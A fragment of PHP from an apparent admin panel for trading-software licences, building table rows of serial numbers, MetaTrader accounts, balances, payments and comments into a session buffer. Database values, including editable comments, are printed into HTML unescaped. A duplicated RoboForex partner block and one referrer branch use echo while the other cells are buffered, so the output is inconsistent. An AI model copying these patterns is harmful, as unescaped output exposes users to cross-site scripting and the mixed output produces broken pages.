		$_SESSION['search'][$z-1].= '<td class="serial '.($sn_block==1?'blocked':'').'"><span data-id="'.$res['serialNo'].'" title="'.(($cn1>0 && $cn2>0)?'Purchased':(($cn1+$cn2>1)?'Only Test':'')).'" class="notifycircle bip'.(($cn1>0 && $cn2>0)?' plus':(($cn1+$cn2>1)?' all':'')).'">'.($cn1+$cn2).'</span><span title="'.$res['UUID'].'" class="csn">'.$res['serialNo'].'</span><span class="iip"><input class="sn_check" type="checkbox" name="'.$res['program'].'" data-id="'.$res['id'].'" value="'.$res['serialNo'].'" '.($sn_block==1?'checked="checked"':'').' title="Blocking"></span><span class="'.($snum?'showdiff':'').'" rel="diff'.$res['id'].'">'.($snum?$max:'').'</span></td>';
		$_SESSION['search'][$z-1].= '<td class="account"><span class="cacc">'.$res['account']."</span></td>";
		// RoboForex Status
		$roboStatus = isset($res['roboaffiliate']) ? $res['roboaffiliate'] : 'no';
		if($roboStatus == 'yes' || $roboStatus == '1' || $roboStatus == 1) {
			echo '<td style="text-align:center;"><span style="color:#00AA00;font-weight:bold;" title="Partner">✓</span></td>';
		} else {
			echo '<td style="text-align:center;"><span style="color:#AA0000;" title="No Partner">✗</span></td>';
		}
		$_SESSION['search'][$z-1].= '<td class="company '.($_COOKIE['showComp']==1?'active':'').'">'.$res['company'].'<br>'.$res['server'].' ('.$res['currency'].')</td>';
		$_SESSION['search'][$z-1].= '<td class="type '.($res['trading']=='Investor'?'err" title="Investor account"':($res['type']=='Real'?'real':'demo').'"').'>'.$res['type']."</td>";
		$_SESSION['search'][$z-1].= '<td class="mt'.($res['version']<$vers?' minus':'').'">'.$res['mt'].' ('.$res['version'].')'."</td>";
		$_SESSION['search'][$z-1].= '<td class="wrap"><span title="Start Balance" class="ss">'.$res['hist_balance'].'</span>
		                       <span title="Balance" class="sf '.($res['hist_balance']==$res['balance']?'':($res['hist_balance']<$res['balance']?'plus':'minus')).'">'.$res['balance'].'</span>
							   <br/>
							   <span title="Equity" class="ss '.($res['balance']==$res['equity']?'':($res['balance']<$res['equity']?'plus':'minus')).'">'.$res['equity'].'</span>
							   <span title="All Profit (Account Profit: '.($res['equity']-$res['balance']).')" class="sf">'.$res['close_profit'].'</span>
              </td>';
		/*$hist_package = explode("|", $res['hist_package']);
		$cn=-1;for($x=0; $x<count($hist_package); $x++) { if($hist_package[$x]!='') $cn++;}
		$_SESSION['search'][$z-1].= '<td class="ver"><span class="notifycircle show_popup ver" rel="popup'.$res['id'].'">'.$cn.'</span>';
		$_SESSION['search'][$z-1].= '<span><form action="files/update.php" method="POST" class="package">';
		$_SESSION['search'][$z-1].= '<select name="field">';
     	  foreach ($packages as $i) {
		   $_SESSION['search'][$z-1].= '<option value="'.$i.'" '.($res['package']==$i?"selected":"").'>'.$i.'</option>';
          }
		$_SESSION['search'][$z-1].= '</select>';
		$_SESSION['search'][$z-1].= '<input type="hidden" name="update" value="1">';
		$_SESSION['search'][$z-1].= '<input type="hidden" name="add" value="'.$_SERVER['PHP_AUTH_USER'].'">';
		$_SESSION['search'][$z-1].= '<input type="hidden" name="id" value="'.$res['id'].'">';
		$_SESSION['search'][$z-1].= '</form></span>';
		$_SESSION['search'][$z-1].= '</td>';*/
		$hist_payment = explode("|", $res['hist_payment']);
		$cn=-1;for($x=0; $x<count($hist_payment); $x++) { if($hist_payment[$x]!='') $cn++;}
		$_SESSION['search'][$z-1].= '<td class="summ"><span class="notifycircle show_popup pay" rel="popup'.$res['id'].'">'.$cn.'</span><div class="payment '.($res['payment']>0?'paid':'').'" data-id="'.$res['id'].'" contenteditable>'.$res['payment']."</div></td>";
		$_SESSION['search'][$z-1].= '<td class="last'.($res['last_connect']>$deactivate?'red':'norm').' '.(date('d.m.Y',time())==date('d.m.Y',$res['last_connect'])?'curr':'').' '.($res['mt_check']<2?'err000" title="check='.$res['mt_check'].' ex'.$res['mt'].'. Update the program version!&#013check=2 ex'.$res['mt'].' fix (Recommended at least 3)"':'"').'>'.date('d.m.Y',$res['last_connect'])." (".$res['connect']."|".$res['disconnect'].")</td>";
	    $_SESSION['search'][$z-1].= '<td class="tm">';$_SESSION['search'][$z-1].=$id;
		$_SESSION['search'][$z-1].= '</td>';
		$hist_comment = explode("|", $res['hist_comment']);
		$cn=-1;for($x=0; $x<count($hist_comment); $x++) { if($hist_comment[$x]!='') $cn++;}
        $_SESSION['search'][$z-1].= '<td class="comm tcom '.($_COOKIE['showCom']==1?'active':'').'"><span class="notifycircle show_popup com '.($_COOKIE['showCom']==1?'none':'').'" rel="popup'.$res['id'].'">'.$cn.'</span><div class="jcom" data-id="'.$res['id'].'" contenteditable style="max-width:250px;">'.$res['comment']."</div></td>";
		if($res['registrar'] == $res['ref'] || $res['registrar'] =='site') {
		$_SESSION['search'][$z-1].= '<td class="adm_ref adm_ref_t wrap '.($_COOKIE['showAdm']==1?'active':'').'">'.$res['registrar']."</td>";
		} else {
		echo '<td class="adm_ref_t wrap '.($_COOKIE['showAdm']==1?'active':'').'">'.$res['registrar'].' ('.$res['ref'].'('.$res['fee'].')</td>';
		}
		// RoboForex Partner Status
		$roboStatus = isset($res['roboaffiliate']) ? $res['roboaffiliate'] : 'no';
		if($roboStatus == 'yes' || $roboStatus == '1' || $roboStatus == 1) {
			echo '<td style="text-align:center;color:#00AA00;font-weight:bold;" title="RoboForex Partner">✓</td>';
		} else {
			echo '<td style="text-align:center;color:#AA0000;" title="Not a RoboForex Partner">✗</td>';
		}